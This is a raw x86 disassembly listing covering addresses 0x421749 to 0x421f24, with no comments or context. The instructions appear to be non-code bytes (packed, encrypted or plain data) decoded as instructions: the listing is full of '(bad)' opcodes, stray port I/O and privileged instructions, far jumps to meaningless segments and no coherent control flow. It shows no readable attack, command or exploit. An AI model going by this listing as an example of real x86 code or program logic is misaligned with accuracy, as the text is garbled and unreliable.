  421749:	add    DWORD PTR [edi+ebx*2+0x68806f88],esi
  421750:	lock and DWORD PTR [esi],0x7
  421754:	sbb    ah,BYTE PTR [ebp-0x60d0a4d8]
  42175a:	test   BYTE PTR [esi-0x49fe6c0b],cl
  421760:	mov    WORD PTR [eax],?
  421762:	add    eax,0x98ebdba4
  421767:	push   ss
  421768:	fwait
  421769:	xchg   DWORD PTR [eax],eax
  42176b:	hlt    
  42176c:	(bad)  
  42176d:	cdq    
  42176e:	mov    ebx,0x3495b2cd
  421773:	mov    dl,0xf2
  421775:	mov    ebx,DWORD PTR [ecx-0x1d3d6c25]
  42177b:	popa   
  42177c:	out    dx,eax
  42177d:	push   0xd7716df5
  421782:	and    al,0xb3
  421784:	dec    esi
  421785:	xchg   ebx,eax
  421786:	(bad)  
  421787:	sub    esp,DWORD PTR [ecx]
  421789:	jmp    0x2558:0xaa631b98
  421790:	js     0x42178f
  421792:	loope  0x421796
  421794:	push   esi
  421795:	sar    DWORD PTR [ecx+0x72],1
  421798:	not    BYTE PTR [esi+0x20]
  42179b:	jge    0x4217ff
  42179d:	out    0x8a,eax
  42179f:	cmp    al,0xc5
  4217a1:	cbw    
  4217a3:	xchg   ecx,eax
  4217a4:	ror    DWORD PTR [ecx+0x297f9be2],0x9e
  4217ab:	mov    ebp,0xd24fdb6c
  4217b0:	not    ch
  4217b2:	and    edx,DWORD PTR ds:0xc3970b0b
  4217b8:	int3   
  4217b9:	das    
  4217ba:	add    al,0xb1
  4217bc:	pop    ecx
  4217bd:	jbe    0x421837
  4217bf:	repnz dec ebp
  4217c1:	outs   dx,BYTE PTR ds:[esi]
  4217c2:	iret   
  4217c3:	add    eax,0xb3f7e1ad
  4217c8:	xchg   edi,eax
  4217c9:	sbb    eax,0xd7a2a89
  4217ce:	scas   al,BYTE PTR es:[edi]
  4217cf:	mov    esi,0x73b282a0
  4217d4:	cld    
  4217d5:	inc    edx
  4217d6:	int3   
  4217d7:	push   0x37d912bf
  4217dc:	iret   
  4217dd:	les    ebx,FWORD PTR [eax*1-0x1bf443d]
  4217e4:	shl    DWORD PTR [esi-0x4874c5e7],1
  4217ea:	inc    edx
  4217eb:	les    ebx,FWORD PTR [edi+0x17]
  4217ee:	inc    edx
  4217ef:	bound  ebp,QWORD PTR [edi+0x5da85f80]
  4217f5:	jmp    0x5dff0fe5
  4217fa:	lea    edx,[eax]
  4217fc:	mov    dh,0xc5
  4217fe:	xor    BYTE PTR [eax+esi*2],ch
  421801:	dec    ecx
  421802:	lods   eax,DWORD PTR ds:[esi]
  421803:	in     al,dx
  421804:	out    0x69,al
  421806:	shl    BYTE PTR [edi-0x20],cl
  421809:	xchg   edi,eax
  42180a:	ss jmp 0x421878
  42180d:	inc    edi
  42180e:	xchg   edx,eax
  42180f:	adc    ebp,DWORD PTR [eax-0x1caeb685]
  421815:	xlat   BYTE PTR ds:[ebx]
  421816:	ss push eax
  421818:	retf   0x5285
  42181b:	mov    edx,0x4ae5ce20
  421820:	pop    edx
  421822:	cs sub eax,0x22575a09
  421828:	cwde   
  421829:	mov    ds:0x6a003593,eax
  42182e:	push   ss
  42182f:	enter  0x3984,0x9
  421833:	jmp    0x42187f
  421835:	imul   esp,DWORD PTR [ebx+0x21],0xffffffbd
  421839:	sbb    al,0xcd
  42183b:	aam    0x82
  42183d:	out    dx,eax
  42183e:	mov    ds:0xe1574e92,al
  421843:	mov    al,ds:0xb1f9f6f1
  421848:	int3   
  421849:	jg     0x421831
  42184b:	xor    BYTE PTR [edi+0x2f],al
  42184e:	jns    0x4218bd
  421850:	mov    ch,0x23
  421852:	icebp  
  421853:	aaa    
  421854:	xchg   ecx,eax
  421855:	outs   dx,DWORD PTR ds:[esi]
  421856:	mov    sp,di
  421859:	xchg   ebx,eax
  42185a:	push   esp
  42185b:	idiv   edi
  42185d:	inc    ebx
  42185e:	sub    edi,DWORD PTR [eax-0x33]
  421861:	aam    0x5a
  421863:	and    ch,BYTE PTR [eax+eax*1]
	...
  42186e:	add    BYTE PTR [eax],al
  421870:	add    BYTE PTR [esi],bh
  421872:	inc    esi
  421873:	dec    edx
  421874:	mov    ebp,0xc7ffbd7a
  421879:	popa   
  42187a:	dec    edi
  42187b:	push   ds
  42187c:	sbb    DWORD PTR [eax+0x36],edx
  42187f:	add    eax,0x191e501
  421884:	add    BYTE PTR [ebx+eax*1+0x29a50000],ch
  42188b:	shr    DWORD PTR [edi],cl
  42188d:	mov    al,ds:0x35f2a600
  421892:	shr    ebp,cl
  421894:	arpl   WORD PTR [edi-0x28],sp
  421897:	xchg   ebx,eax
  421898:	inc    esi
  421899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42189a:	fisttp DWORD PTR [eax-0x62]
  42189d:	sub    bh,BYTE PTR [ebx-0x14d0df64]
  4218a3:	mov    edx,0xc1e62536
  4218a8:	mov    esi,0x49c18c3f
  4218ad:	push   edi
  4218ae:	call   0x6f6f7bd6
  4218b3:	je     0x42190c
  4218b5:	inc    ebx
  4218b6:	cmp    DWORD PTR [esi+edi*8],esi
  4218b9:	pop    edx
  4218ba:	xchg   ecx,eax
  4218bb:	mov    bl,0xf7
  4218bd:	(bad)  
  4218be:	aad    0x4a
  4218c0:	aas    
  4218c1:	(bad)  
  4218c4:	in     al,0x54
  4218c6:	ins    DWORD PTR es:[edi],dx
  4218c7:	sub    ecx,eax
  4218c9:	inc    edi
  4218ca:	ror    DWORD PTR [eax+0x0],0x1d
  4218ce:	retf   0x3844
  4218d1:	cmp    cl,ah
  4218d3:	dec    esi
  4218d4:	jnp    0x42191b
  4218d6:	push   eax
  4218d7:	push   0x7febb113
  4218dc:	push   esi
  4218dd:	ret    
  4218de:	xor    al,0xac
  4218e0:	mov    ds:0xd9dfb53c,al
  4218e5:	push   ebx
  4218e6:	mov    ebp,0x4bda4b61
  4218eb:	inc    ecx
  4218ec:	fnsave [ecx+ebx*8]
  4218ef:	lods   eax,DWORD PTR ds:[esi]
  4218f0:	xor    eax,0x17c7975f
  4218f5:	mov    edi,0x9846853a
  4218fa:	sti    
  4218fb:	fwait
  4218fc:	nop
  4218fd:	sbb    DWORD PTR [ebp-0x34],ebp
  421900:	mov    DWORD PTR [edi+0x3c],ebx
  421903:	xchg   ebx,eax
  421904:	bound  edi,QWORD PTR [ebx-0x9]
  421907:	xor    al,0xd4
  421909:	clc    
  42190a:	shl    DWORD PTR [ebx-0x57],0x36
  42190e:	mov    edx,0x4ff1a3ec
  421913:	ret    0x6c3
  421916:	sti    
  421917:	aaa    
  421918:	lds    edx,FWORD PTR [edx]
  42191a:	dec    edx
  42191b:	mov    gs,WORD PTR [esi+0x13746907]
  421921:	xor    BYTE PTR [ebp+0x18],0x28
  421925:	cmp    al,0xeb
  421927:	call   0xa91b:0xd36018be
  42192e:	lea    ebx,[edx]
  421930:	cmp    eax,0x803187f0
  421935:	ret    
  421936:	aas    
  421937:	pop    esi
  421938:	test   eax,0x155fc88e
  42193d:	hlt    
  42193e:	mov    DWORD PTR ds:0x17951e22,edi
  421944:	popf   
  421945:	xchg   ebp,eax
  421946:	out    0x5d,al
  421948:	pop    es
  421949:	sub    BYTE PTR [ecx],ch
  42194b:	(bad)  
  42194c:	pushf  
  42194d:	sahf   
  42194e:	dec    ebp
  42194f:	jle    0x42195f
  421951:	xchg   ebx,eax
  421952:	setg   BYTE PTR ds:0xa5e4ad
  421959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42195a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42195b:	xor    bl,BYTE PTR [esi]
  42195d:	data16 or BYTE PTR [edx],ah
  421960:	enter  0xc30e,0xb6
  421964:	rol    BYTE PTR [ecx],cl
  421966:	push   edi
  421967:	xchg   ebp,eax
  421968:	sbb    al,0x77
  42196a:	mov    DWORD PTR [edi-0x27684f94],0xde0bdda6
  421974:	xlat   BYTE PTR ds:[ebx]
  421975:	mov    ch,0x21
  421977:	push   esi
  421978:	mov    eax,ds:0x157dedda
  42197d:	mov    DWORD PTR [edx+0x43],eax
  421980:	mov    BYTE PTR [eax+0x2fd6f5de],bh
  421986:	sar    eax,0x8e
  421989:	icebp  
  42198a:	sti    
  42198b:	mov    eax,0x69ad0ea7
  421990:	push   es
  421991:	cwde   
  421992:	shl    BYTE PTR ds:0x88d477be,1
  421998:	add    ah,0xe
  42199b:	int    0x97
  42199d:	fdiv   st(7),st
  42199f:	les    edx,FWORD PTR [ebp+0x38c3b90a]
  4219a5:	mov    bh,0x88
  4219a7:	or     al,0xd
  4219a9:	adc    bl,BYTE PTR [ecx]
  4219ab:	sub    ah,BYTE PTR [edi]
  4219ad:	cmp    DWORD PTR [esi],esi
  4219af:	mov    ecx,DWORD PTR [ecx+0x3555fac0]
  4219b5:	into   
  4219b6:	jnp    0x4219e9
  4219b8:	adc    ecx,DWORD PTR [ebp+0x2ca30481]
  4219be:	sti    
  4219bf:	mov    edx,ebx
  4219c1:	sub    esi,ebx
  4219c3:	ins    DWORD PTR es:[edi],dx
  4219c4:	mov    eax,0xfec18b33
  4219c9:	(bad)  
  4219ca:	ins    DWORD PTR es:[edi],dx
  4219cb:	ss fcmovb st,st(3)
  4219ce:	mov    dh,0x9d
  4219d0:	cmp    ecx,esp
  4219d2:	fst    DWORD PTR [esi]
  4219d4:	jg     0x4219c9
  4219d6:	xchg   ebx,eax
  4219d7:	(bad)  
  4219d8:	cmp    bh,0x6c
  4219db:	dec    ecx
  4219dc:	in     eax,dx
  4219dd:	sar    dl,1
  4219df:	sub    al,0xbd
  4219e1:	in     eax,dx
  4219e2:	dec    esi
  4219e3:	pop    eax
  4219e4:	pop    eax
  4219e5:	adc    cl,cl
  4219e7:	shr    DWORD PTR [ecx],0xb4
  4219ea:	(bad)  
  4219eb:	enter  0x60bc,0x8a
  4219ef:	push   ss
  4219f0:	sub    al,0xbe
  4219f2:	aam    0x11
  4219f4:	test   al,0xbc
  4219f6:	das    
  4219f7:	adc    ebp,DWORD PTR [esi*2-0x3f882117]
  4219fe:	mov    WORD PTR [edi-0x18dc9ffb],es
  421a04:	loopne 0x421a3c
  421a06:	retf   
  421a07:	stos   BYTE PTR es:[edi],al
  421a08:	push   ebp
  421a09:	mov    edi,0x2a091414
  421a0e:	mov    ecx,0x57948c82
  421a13:	or     DWORD PTR [edi+edx*8],edi
  421a16:	inc    esp
  421a17:	pop    ebp
  421a18:	pop    ds
  421a19:	fst    QWORD PTR [ecx+0x3c]
  421a1c:	xchg   esi,eax
  421a1d:	nop
  421a1e:	adc    DWORD PTR [esi+0x40f8f4c3],ebx
  421a24:	adc    al,0x73
  421a26:	push   esi
  421a27:	imul   eax,DWORD PTR [ecx+0x39],0x74
  421a2b:	mov    al,0x1a
  421a2d:	inc    edx
  421a2e:	stos   BYTE PTR es:[edi],al
  421a2f:	ror    BYTE PTR [ebx-0x1f369619],cl
  421a35:	adc    eax,ebx
  421a37:	imul   ecx,DWORD PTR [esi+0x38],0xffffffd5
  421a3b:	inc    ecx
  421a3c:	js     0x4219ef
  421a3e:	imul   esp,DWORD PTR [edi-0xe],0x8afc7cf2
  421a45:	mov    bh,0xb1
  421a47:	cli    
  421a48:	aam    0x71
  421a4a:	and    esi,DWORD PTR [eax+0x23ec2770]
  421a50:	repnz clc 
  421a52:	inc    ebp
  421a53:	adc    ch,BYTE PTR [edx]
  421a55:	or     ch,dh
  421a57:	mov    DWORD PTR [ebp-0x3a],ebp
  421a5a:	xor    al,0xf3
  421a5c:	das    
  421a5d:	sbb    al,BYTE PTR [ecx+0x2b]
  421a60:	and    al,0xb5
  421a62:	push   esi
  421a63:	outs   dx,DWORD PTR ds:[esi]
  421a64:	xchg   esp,eax
  421a65:	shl    BYTE PTR [esp+eax*8-0x6f36b89f],0x7
  421a6d:	fst    QWORD PTR [ecx+0x786ef9f6]
  421a73:	bound  edi,QWORD PTR [edx+edi*2+0x425a562b]
  421a7a:	loopne 0x4219fc
  421a7c:	aaa    
  421a7d:	dec    edx
  421a7e:	jge    0x421ad4
  421a80:	(bad)  
  421a84:	and    BYTE PTR [edx],ch
  421a86:	popf   
  421a87:	bound  eax,QWORD PTR [edi-0x42]
  421a8a:	and    DWORD PTR [ecx+0x26b7efe9],ebx
  421a90:	add    esp,0xffffffbb
  421a93:	jle    0x421abf
  421a95:	pop    edx
  421a96:	push   ebp
  421a97:	mov    BYTE PTR [edi-0x4d],dh
  421a9a:	adc    BYTE PTR [ebp+0x4754e8d],al
  421aa0:	or     bh,BYTE PTR [esi]
  421aa2:	adc    dh,bl
  421aa4:	inc    ebx
  421aa5:	call   0xbc5ace7a
  421aaa:	lock push edi
  421aac:	mov    ah,0xa6
  421aae:	daa    
  421aaf:	sbb    ecx,esi
  421ab1:	mov    edi,0xf987aa6a
  421ab6:	mov    esp,eax
  421ab8:	pop    ecx
  421ab9:	fld    TBYTE PTR [edx-0x78]
  421abc:	add    ah,cl
  421abe:	xor    dl,BYTE PTR [esi+edi*8-0x62]
  421ac2:	sub    DWORD PTR [edi],edi
  421ac4:	jge    0x421ab6
  421ac6:	sbb    BYTE PTR [esp+ebx*1-0x24],bl
  421aca:	and    BYTE PTR [edi+0x7d4f01a7],dh
  421ad0:	inc    esp
  421ad1:	stc    
  421ad2:	jno    0x421aa2
  421ad4:	pop    esp
  421ad5:	fnstcw WORD PTR [ecx+eax*4-0x6e853251]
  421adc:	jnp    0x421b5a
  421ade:	sub    BYTE PTR [ecx+0x2b],al
  421ae1:	(bad)  
  421ae2:	arpl   bx,sp
  421ae4:	pop    ebp
  421ae5:	icebp  
  421ae6:	div    esi
  421ae8:	rol    al,0x2b
  421aeb:	stos   BYTE PTR es:[edi],al
  421aec:	and    DWORD PTR [edi+0xc],0xdea3f947
  421af3:	sbb    al,0x93
  421af5:	or     DWORD PTR [esi+ebx*4],0xffffffbd
  421af9:	mov    bl,0x7e
  421afb:	cmp    BYTE PTR [edi-0x48],al
  421afe:	and    eax,0x214f62ce
  421b03:	mov    cl,0x2f
  421b05:	(bad)  
  421b06:	cmp    BYTE PTR ds:0x33639018,ah
  421b0c:	je     0x421b7e
  421b0e:	icebp  
  421b0f:	jmp    0x746:0x3610e9a4
  421b16:	xchg   ecx,eax
  421b17:	push   ss
  421b18:	pop    ebx
  421b19:	fidivr DWORD PTR [ecx+0x2e2824a8]
  421b1f:	add    ecx,ebp
  421b21:	push   cs
  421b22:	out    dx,eax
  421b23:	rcl    DWORD PTR [esi-0x27],cl
  421b26:	push   esp
  421b27:	adc    dh,BYTE PTR [edx]
  421b29:	and    BYTE PTR [ebx+0x6319c8e9],al
  421b2f:	call   0x8628:0x2d0d17e
  421b36:	mov    dh,0x5e
  421b38:	jmp    0x421ac0
  421b3a:	mov    cl,BYTE PTR [ecx+0x12]
  421b3d:	div    DWORD PTR [ecx-0x51]
  421b40:	push   eax
  421b41:	mov    ecx,0x11e825e8
  421b46:	xchg   esp,eax
  421b47:	mov    ds:0x4083fa00,eax
  421b4c:	scas   al,BYTE PTR es:[edi]
  421b4d:	mov    edi,0x221ceb98
  421b52:	scas   eax,DWORD PTR es:[edi]
  421b53:	xor    DWORD PTR [ecx-0x26a15bc4],ebp
  421b59:	test   eax,0x1e4f7fb8
  421b5e:	xchg   edi,eax
  421b5f:	push   ebx
  421b60:	pop    ecx
  421b61:	cmp    al,0xfb
  421b63:	mov    ch,0x21
  421b65:	mov    dl,0xf4
  421b67:	dec    ebp
  421b68:	(bad)  
  421b69:	dec    edi
  421b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b6b:	clc    
  421b6c:	inc    eax
  421b6d:	scas   eax,DWORD PTR es:[edi]
  421b6e:	jmp    0x9b65eee1
  421b73:	iret   
  421b74:	jl     0x421b40
  421b76:	inc    eax
  421b77:	in     eax,0x70
  421b79:	dec    eax
  421b7a:	pop    eax
  421b7b:	cmp    al,0x1c
  421b7d:	pop    ebx
  421b7e:	inc    ebp
  421b7f:	dec    eax
  421b80:	imul   eax,DWORD PTR [ebx+0x77],0xaf591c3
  421b87:	rol    dh,1
  421b89:	xor    DWORD PTR [esi+0x4d416f1],ecx
  421b8f:	mov    esp,0xde3e7355
  421b94:	cdq    
  421b95:	daa    
  421b96:	jl     0x421b9d
  421b98:	js     0x421bad
  421b9a:	sub    ebp,DWORD PTR ds:[edi]
  421b9d:	mov    dh,0x1
  421b9f:	push   ecx
  421ba0:	jmp    0x5952:0x2341bc03
  421ba7:	iret   
  421ba8:	add    DWORD PTR [edi+0x4d],0xfb012c41
  421baf:	xchg   DWORD PTR [esi+0x9],edx
  421bb2:	rcr    BYTE PTR [edx+0x12],cl
  421bb5:	jmp    0xcb4:0x31d7d4c9
  421bbc:	gs gs jmp 0x421c2d
  421bc0:	icebp  
  421bc1:	adc    al,0x37
  421bc3:	inc    esi
  421bc4:	mov    esi,DWORD PTR [esi-0x2e]
  421bc7:	enter  0x466,0x8d
  421bcb:	push   esi
  421bcc:	and    eax,0x626ca7d7
  421bd1:	(bad)  
  421bd2:	cld    
  421bd3:	addr16 int3 
  421bd5:	icebp  
  421bd6:	jp     0x421b88
  421bd8:	jl     0x421c39
  421bda:	cmc    
  421bdb:	xor    al,0x1
  421bdd:	mov    ebx,0xe2ca2f2c
  421be2:	or     eax,0x96bfe5f
  421be7:	in     al,dx
  421be8:	push   ds
  421be9:	cmp    eax,0xb7b49b73
  421bee:	mov    ebp,0x6be99d26
  421bf3:	mov    ch,0xa6
  421bf5:	ins    DWORD PTR es:[edi],dx
  421bf6:	fist   WORD PTR [ebp+0x359669de]
  421bfc:	inc    edi
  421bfd:	sub    DWORD PTR [ecx+0x66],0xdcb1e7be
  421c04:	dec    eax
  421c05:	push   es
  421c06:	fldz   
  421c08:	push   edi
  421c09:	pop    eax
  421c0a:	mov    edx,0x5bdc7f35
  421c0f:	ins    DWORD PTR es:[edi],dx
  421c10:	xlat   BYTE PTR ds:[ebx]
  421c11:	inc    di
  421c13:	sahf   
  421c14:	dec    ebp
  421c15:	push   0xfffffffd
  421c17:	stos   DWORD PTR es:[edi],eax
  421c18:	xor    DWORD PTR [ebp-0x5496329c],0x20
  421c1f:	mov    cl,0x95
  421c21:	out    0xf9,eax
  421c23:	pop    es
  421c24:	mov    ch,BYTE PTR [esi]
  421c26:	je     0x421be1
  421c28:	test   ch,ch
  421c2a:	(bad)  
  421c2b:	sub    ecx,eax
  421c2d:	jb     0x421bf1
  421c2f:	jmp    0x91:0xd2e0ba26
	...
  421c3e:	add    BYTE PTR [eax],al
  421c40:	add    BYTE PTR [edx+eax*8],cl
  421c43:	xlat   BYTE PTR ds:[ebx]
  421c44:	and    bl,bh
  421c46:	aaa    
  421c47:	std    
  421c48:	out    dx,al
  421c49:	and    eax,0xd5971a56
  421c4e:	aad    0x13
  421c50:	lea    edx,[ecx-0x53fffe6b]
  421c56:	add    eax,DWORD PTR [eax]
  421c58:	add    BYTE PTR [eax+0x7c7e8398],bl
  421c5e:	cmp    bh,BYTE PTR [edi]
  421c60:	loope  0x421bff
  421c62:	mov    al,BYTE PTR [ecx-0x2e1fd35a]
  421c68:	pop    ebp
  421c69:	push   es
  421c6a:	and    eax,0xe23910e2
  421c6f:	lods   eax,DWORD PTR ds:[esi]
  421c70:	imul   esi,DWORD PTR [edx+0x6ef28b43],0xffffffed
  421c77:	jle    0x421c2f
  421c79:	pop    ds
  421c7a:	arpl   WORD PTR [edx-0x41940c33],di
  421c80:	jp     0x421cda
  421c82:	cdq    
  421c83:	jmp    0xb8970045
  421c88:	or     bl,BYTE PTR [esi-0x6f9b475c]
  421c8e:	sbb    ch,dl
  421c90:	cmp    al,0xd3
  421c92:	jmp    0x59aabd3e
  421c97:	dec    eax
  421c98:	add    ebx,edx
  421c9a:	and    DWORD PTR [esi],ebp
  421c9c:	mov    ecx,0x6111275b
  421ca1:	xchg   esi,eax
  421ca2:	cli    
  421ca3:	in     al,dx
  421ca4:	xor    cl,al
  421ca6:	xchg   edi,eax
  421ca7:	sbb    ecx,edx
  421ca9:	mov    bl,0xfe
  421cab:	push   0xa8a42b7
  421cb0:	sahf   
  421cb1:	add    eax,0x1f9cb69
  421cb6:	or     eax,0x6f44995d
  421cbb:	and    eax,esp
  421cbd:	lock jo 0x421d14
  421cc0:	(bad)
  421cc3:	inc    esi
  421cc4:	and    eax,0x28f4928c
  421cc9:	mov    bl,dh
  421ccb:	jo     0x421ca9
  421ccd:	adc    ch,BYTE PTR [edx-0x34]
  421cd0:	jnp    0x421c7f
  421cd2:	cld    
  421cd3:	adc    DWORD PTR [edi+0x5b157f26],edi
  421cd9:	not    DWORD PTR [esi-0x1e237096]
  421cdf:	mov    ecx,0x3ac4fdeb
  421ce4:	test   eax,0xeb50c84c
  421ce9:	sub    cl,BYTE PTR [ecx-0x51640760]
  421cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cf0:	mov    ch,0xac
  421cf2:	dec    esi
  421cf3:	pop    ss
  421cf4:	mov    bl,cl
  421cf6:	mov    al,0xae
  421cf8:	pop    ebx
  421cf9:	jge    0x421c96
  421cfb:	daa    
  421cfc:	imul   esi,ecx,0xffffff8d
  421cff:	cmp    DWORD PTR [edi-0x2c],ebp
  421d02:	dec    eax
  421d03:	pop    es
  421d04:	sub    DWORD PTR [ebp-0x1b3addea],ebp
  421d0a:	test   BYTE PTR [ecx],ch
  421d0c:	popf   
  421d0d:	cmp    dl,dh
  421d0f:	mov    al,0x66
  421d11:	int    0x76
  421d13:	rcr    DWORD PTR [ebx],0xfd
  421d16:	mov    al,0x4
  421d18:	popf   
  421d19:	pop    ecx
  421d1a:	inc    edx
  421d1b:	popa   
  421d1c:	push   ebp
  421d1d:	add    DWORD PTR [ebx-0x7f4bd684],eax
  421d23:	lahf   
  421d24:	pop    ebx
  421d25:	ins    BYTE PTR es:[edi],dx
  421d26:	lahf   
  421d27:	jno    0x421d83
  421d29:	sub    al,0x1c
  421d2b:	fsubr  st(6),st
  421d2d:	rcr    DWORD PTR [eax+0x1f8df1fe],cl
  421d33:	add    DWORD PTR [eax-0x5e],0x7bdb0bff
  421d3a:	(bad)  
  421d3b:	dec    edx
  421d3c:	sub    DWORD PTR [ebp-0x33bb9950],ecx
  421d42:	ins    BYTE PTR es:[edi],dx
  421d43:	add    dh,ah
  421d45:	ja     0x421d00
  421d47:	xchg   BYTE PTR [ebp+edx*8+0x6905c0bc],ah
  421d4e:	dec    edi
  421d4f:	and    eax,0x2cf003c2
  421d54:	in     al,0xbf
  421d56:	pusha  
  421d57:	aaa    
  421d58:	push   edi
  421d59:	(bad)  
  421d5b:	mov    bh,al
  421d5d:	cwde   
  421d5e:	sti    
  421d5f:	mov    ds:0x6321c70d,al
  421d64:	cmp    ch,BYTE PTR [ebx+0x53]
  421d67:	popf   
  421d68:	pop    es
  421d69:	sub    ebp,DWORD PTR [edi-0x3c]
  421d6c:	jge    0x421dbc
  421d6e:	ins    DWORD PTR es:[edi],dx
  421d6f:	push   ecx
  421d70:	cmc    
  421d71:	scas   al,BYTE PTR es:[edi]
  421d72:	mov    edi,0x6d6b0e2f
  421d77:	pop    es
  421d78:	sub    eax,0x75416b41
  421d7d:	repnz mov bh,0x6a
  421d80:	cmp    ebx,esp
  421d82:	jge    0x421d14
  421d84:	rcl    esp,1
  421d86:	mov    eax,ds:0x39b61b78
  421d8b:	(bad)  
  421d8c:	xlat   BYTE PTR ds:[ebx]
  421d8d:	adc    bl,BYTE PTR [eax]
  421d8f:	dec    esp
  421d90:	adc    eax,DWORD PTR [ecx-0x6f]
  421d93:	and    edi,edx
  421d95:	jno    0x421ddb
  421d97:	test   BYTE PTR [ebx-0x9a3dd4f],ch
  421d9d:	cmp    eax,0xd1f7ecd4
  421da2:	inc    ebp
  421da3:	aad    0xf0
  421da5:	mov    bl,0x9a
  421da7:	aad    0xaf
  421da9:	mul    DWORD PTR [ebp-0x70fdfb5d]
  421daf:	adc    DWORD PTR [eax-0x71c53f9c],esp
  421db5:	lahf   
  421db6:	ins    DWORD PTR es:[edi],dx
  421db7:	fwait
  421db8:	sahf   
  421db9:	add    ecx,esi
  421dbb:	or     BYTE PTR [esi+0x6cab2409],0xcb
  421dc2:	in     eax,0x8a
  421dc4:	retf   0xfa8
  421dc7:	test   DWORD PTR [edi],0xdfd933d7
  421dcd:	out    0x8a,al
  421dcf:	sub    al,0xe2
  421dd1:	sub    eax,0xd04e9387
  421dd6:	push   ebx
  421dd7:	sub    DWORD PTR [edx],edx
  421dd9:	scas   eax,DWORD PTR es:[edi]
  421dda:	retf   
  421ddb:	gs (bad) 
  421dde:	rcr    DWORD PTR [eax+edx*2+0x3ff7cfd4],cl
  421de5:	loopne 0x421e07
  421de7:	pop    eax
  421de8:	cdq    
  421de9:	add    DWORD PTR ds:0x4784c3b6,esp
  421def:	push   0xfffffff6
  421df1:	lods   al,BYTE PTR ds:[esi]
  421df2:	ss loopne 0x421db5
  421df5:	adc    DWORD PTR [edx+0xb],esp
  421df8:	fwait
  421df9:	adc    dl,BYTE PTR [ecx]
  421dfb:	and    eax,0xb7299b5
  421e00:	lods   eax,DWORD PTR ds:[esi]
  421e01:	fiadd  DWORD PTR [ebx-0x53]
  421e04:	nop
  421e05:	enter  0xf9cf,0xe
  421e09:	push   ebx
  421e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e0b:	(bad)  
  421e0c:	mul    BYTE PTR ds:[ebx+0xb541370]
  421e13:	sti    
  421e14:	int3   
  421e15:	dec    ebx
  421e16:	mov    ch,0x51
  421e18:	dec    ecx
  421e19:	xchg   BYTE PTR [ebx],bl
  421e1b:	sbb    eax,0x40e8b8f0
  421e20:	mov    ds:0x7f72a09f,al
  421e25:	xor    bh,BYTE PTR [esi+esi*1]
  421e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e29:	aas    
  421e2a:	add    ecx,ebx
  421e2c:	pop    eax
  421e2d:	xchg   esp,eax
  421e2e:	arpl   WORD PTR [bx+di],ax
  421e31:	mov    eax,0xd43b5b75
  421e36:	sbb    ebp,edx
  421e38:	push   0x74
  421e3a:	in     eax,dx
  421e3b:	rcl    eax,cl
  421e3d:	or     eax,0x2345289d
  421e42:	mov    eax,ds:0x27f1ed4
  421e47:	cmp    al,0xea
  421e49:	jl     0x421dce
  421e4b:	add    eax,0x600e492c
  421e50:	add    dh,BYTE PTR [ebp+0x72a30cd5]
  421e56:	lods   eax,DWORD PTR ds:[esi]
  421e57:	mov    ebx,es
  421e59:	sbb    DWORD PTR [edx-0x7d64f27f],esp
  421e5f:	lods   al,BYTE PTR ds:[esi]
  421e60:	add    al,0x8b
  421e62:	jae    0x421e35
  421e64:	gs inc ebp
  421e66:	lea    esp,[eax-0x42]
  421e69:	sbb    BYTE PTR [ebx-0x2e],0xf3
  421e6d:	and    al,0xb4
  421e6f:	sub    ebx,DWORD PTR [ecx]
  421e71:	push   es
  421e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e73:	fbld   TBYTE PTR [ebp+0x4d2f0151]
  421e79:	sub    edx,esi
  421e7b:	inc    edi
  421e7c:	xchg   esp,eax
  421e7d:	mov    ebp,DWORD PTR [ebx]
  421e7f:	sub    al,0x22
  421e81:	or     al,0x82
  421e83:	mov    edi,0xe9d818e8
  421e88:	xor    eax,0x8d23ebd7
  421e8d:	test   DWORD PTR [edx-0x789ee459],esp
  421e93:	push   cs
  421e94:	in     al,0x4d
  421e96:	cdq    
  421e97:	add    eax,0x85deeb23
  421e9c:	fadd   st,st(0)
  421e9e:	or     DWORD PTR [edx-0x61],esp
  421ea1:	stc    
  421ea2:	mov    dh,0x4c
  421ea4:	aas    
  421ea5:	sub    BYTE PTR [ebx],0xaa
  421ea8:	out    dx,al
  421ea9:	jbe    0x421e44
  421eab:	push   0xf
  421ead:	es ret 
  421eaf:	dec    edx
  421eb0:	repz in eax,0x32
  421eb3:	iret   
  421eb4:	or     edx,edi
  421eb6:	push   0xa4c01d4
  421ebb:	lahf   
  421ebc:	sbb    DWORD PTR [edi+0x72],edi
  421ebf:	test   DWORD PTR [edi],ebp
  421ec1:	or     bh,ah
  421ec3:	lods   eax,DWORD PTR ds:[esi]
  421ec4:	idiv   DWORD PTR [ebx-0x7056a566]
  421eca:	push   ss
  421ecb:	add    DWORD PTR [eax-0x20a6063],edi
  421ed1:	js     0x421ec7
  421ed3:	adc    al,0x75
  421ed5:	shr    DWORD PTR [edi+0x35e6be40],cl
  421edb:	pop    esp
  421edc:	pop    ebp
  421edd:	cmc    
  421ede:	scas   eax,DWORD PTR es:[edi]
  421edf:	jno    0x421f45
  421ee1:	cmp    al,0x24
  421ee3:	xchg   ecx,eax
  421ee4:	cdq    
  421ee5:	sub    edi,edx
  421ee7:	scas   eax,DWORD PTR es:[edi]
  421ee8:	push   0xc5c4524e
  421eed:	jb     0x421e96
  421eef:	mov    ah,0xa2
  421ef1:	adc    DWORD PTR [ebp-0xb251490],esp
  421ef7:	mov    ds:0x73551de,al
  421efc:	aas    
  421efd:	retf   0xb7f
  421f00:	cld    
  421f01:	test   DWORD PTR [edi+0x2b],esp
  421f04:	lods   al,BYTE PTR ds:[esi]
  421f05:	mov    eax,ds:0xe166cd78
  421f0a:	aam    0xb3
  421f0c:	sub    esi,ebp
  421f0e:	(bad)  [ecx+0x3a]
  421f11:	mov    WORD PTR [eax+eax*1-0x3d],es
  421f15:	and    cl,bl
  421f17:	pop    ecx
  421f18:	add    ebx,ebx
  421f1a:	pop    edx
  421f1b:	pop    eax
  421f1c:	mov    dl,0xa3
  421f1e:	jno    0x421f34
  421f20:	icebp  
  421f21:	pop    ecx
  421f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f23:	daa    
  421f24:	rcl    edi,1
